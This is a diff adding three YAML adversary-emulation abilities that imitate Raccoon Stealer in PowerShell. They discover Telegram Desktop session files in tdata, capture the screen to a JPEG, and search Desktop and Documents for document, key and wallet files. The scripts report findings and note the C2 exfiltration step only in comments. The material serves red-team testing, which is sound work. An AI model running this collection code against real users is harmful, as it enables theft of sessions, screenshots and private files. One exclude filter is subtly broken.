@@ -1,0 +1,182 @@
+---
+# Raccoon Stealer - Telegram Cache Discovery
+# MITRE ATT&CK: T1213 - Data from Information Repositories
+
+- id: a1b2c3d4-ffff-4a5b-8c9d-e0f1a2b3c4d5
+  name: raccoon-telegram-cache-discovery
+  description: |
+    Raccoon Stealer investigates Telegram Desktop cache data located in
+    the tdata directory to steal session cookies and sensitive data.
+  tactic: collection
+  technique:
+    attack_id: T1213
+    name: Data from Information Repositories
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "[*] Searching for Telegram Desktop data..."
+          
+          # Raccoon targets: Telegram Desktop\tdata
+          $telegramPaths = @(
+            "$env:APPDATA\Telegram Desktop\tdata",
+            "$env:USERPROFILE\AppData\Roaming\Telegram Desktop\tdata"
+          )
+          
+          $found = $false
+          
+          foreach ($path in $telegramPaths) {
+            if (Test-Path $path) {
+              Write-Output "[+] Telegram tdata found at: $path"
+              $found = $true
+              
+              # List contents (excluding patterns Raccoon ignores)
+              $ignorePatterns = @("*emoji*", "*user_data*", "*tdummy*", "*dumps*")
+              
+              $items = Get-ChildItem -Path $path -ErrorAction SilentlyContinue | 
+                Where-Object { 
+                  $name = $_.Name
+                  $exclude = $false
+                  foreach ($pattern in $ignorePatterns) {
+                    if ($name -like $pattern) { $exclude = $true; break }
+                  }
+                  -not $exclude
+                }
+              
+              Write-Output "[*] Interesting files in tdata:"
+              foreach ($item in $items) {
+                $size = if ($item.PSIsContainer) { "(dir)" } else { "$($item.Length) bytes" }
+                Write-Output "    [+] $($item.Name) - $size"
+              }
+              
+              # Check for key files
+              $keyFiles = @("key_data", "D877F783D5D3EF8C*", "usertag", "settings*")
+              Write-Output "`n[*] Checking for session-critical files..."
+              foreach ($pattern in $keyFiles) {
+                $matches = Get-ChildItem -Path $path -Filter $pattern -ErrorAction SilentlyContinue
+                if ($matches) {
+                  foreach ($match in $matches) {
+                    Write-Output "    [+] Found: $($match.Name)"
+                  }
+                }
+              }
+              
+              break
+            }
+          }
+          
+          if (-not $found) {
+            Write-Output "[-] Telegram Desktop data not found"
+          }
+  singleton: true
+  requirements: []
+
+---
+# Raccoon Stealer - Screenshot Capture
+# MITRE ATT&CK: T1113 - Screen Capture
+
+- id: a1b2c3d4-1010-4a5b-8c9d-e0f1a2b3c4d5
+  name: raccoon-screenshot-capture
+  description: |
+    Raccoon Stealer captures screenshots of the victim's desktop using
+    BitBlt and saves them as Screenshot.jpeg for exfiltration.
+  tactic: collection
+  technique:
+    attack_id: T1113
+    name: Screen Capture
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "[*] Simulating Raccoon Stealer screenshot capture..."
+          
+          # Add necessary .NET assemblies
+          Add-Type -AssemblyName System.Windows.Forms
+          Add-Type -AssemblyName System.Drawing
+          
+          # Get screen dimensions
+          $screen = [System.Windows.Forms.Screen]::PrimaryScreen
+          $width = $screen.Bounds.Width
+          $height = $screen.Bounds.Height
+          
+          Write-Output "[*] Screen dimensions: ${width}x${height}"
+          
+          # Create bitmap (simulating Raccoon's BitBlt approach)
+          $bitmap = New-Object System.Drawing.Bitmap($width, $height)
+          $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+          
+          # Capture screen
+          $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
+          
+          # Save as JPEG (Raccoon saves as Screenshot.jpeg)
+          $screenshotPath = "$env:TEMP\Screenshot.jpeg"
+          $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+          
+          $size = (Get-Item $screenshotPath).Length
+          Write-Output "[+] Screenshot saved to: $screenshotPath ($size bytes)"
+          Write-Output "[*] In actual Raccoon: Prefixed with '---' and sent to C2"
+          
+          # Cleanup
+          $graphics.Dispose()
+          $bitmap.Dispose()
+        cleanup: |
+          Remove-Item -Path "$env:TEMP\Screenshot.jpeg" -Force -ErrorAction SilentlyContinue
+  singleton: true
+  requirements: []
+
+---
+# Raccoon Stealer - File Grabber
+# MITRE ATT&CK: T1119 - Automated Collection
+
+- id: a1b2c3d4-1111-4a5b-8c9d-e0f1a2b3c4d6
+  name: raccoon-file-grabber
+  description: |
+    Raccoon Stealer grabs files based on patterns from configuration,
+    typically targeting text files on Desktop and Documents.
+  tactic: collection
+  technique:
+    attack_id: T1119
+    name: Automated Collection
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "[*] Simulating Raccoon Stealer file grabber..."
+          
+          # Raccoon config example: grbr_:%USERPROFILE%\Desktop|.*txt|*recycle*,*windows*|20|1|1|1|files
+          $searchPaths = @(
+            "$env:USERPROFILE\Desktop",
+            "$env:USERPROFILE\Documents"
+          )
+          
+          $targetExtensions = @("*.txt", "*.doc*", "*.pdf", "*.key", "*.wallet")
+          $excludePatterns = @("*recycle*", "*windows*", "*cache*")
+          $maxFiles = 20
+          $maxSize = 1MB
+          
+          $grabbedFiles = @()
+          
+          foreach ($path in $searchPaths) {
+            if (Test-Path $path) {
+              Write-Output "`n[*] Searching: $path"
+              
+              foreach ($ext in $targetExtensions) {
+                $files = Get-ChildItem -Path $path -Filter $ext -Recurse -ErrorAction SilentlyContinue |
+                  Where-Object { 
+                    $_.Length -lt $maxSize -and 
+                    ($excludePatterns | ForEach-Object { $_.FullName -notlike $_ }) -notcontains $false
+                  } |
+                  Select-Object -First $maxFiles
+                
+                foreach ($file in $files) {
+                  Write-Output "    [+] Found: $($file.Name) ($($file.Length) bytes)"
+                  $grabbedFiles += $file.FullName
+                }
+              }
+            }
+          }
+          
+          Write-Output "`n[*] Total files matching criteria: $($grabbedFiles.Count)"
+          Write-Output "[*] In actual Raccoon: Files would be exfiltrated to C2"
+  singleton: true
+  requirements: []
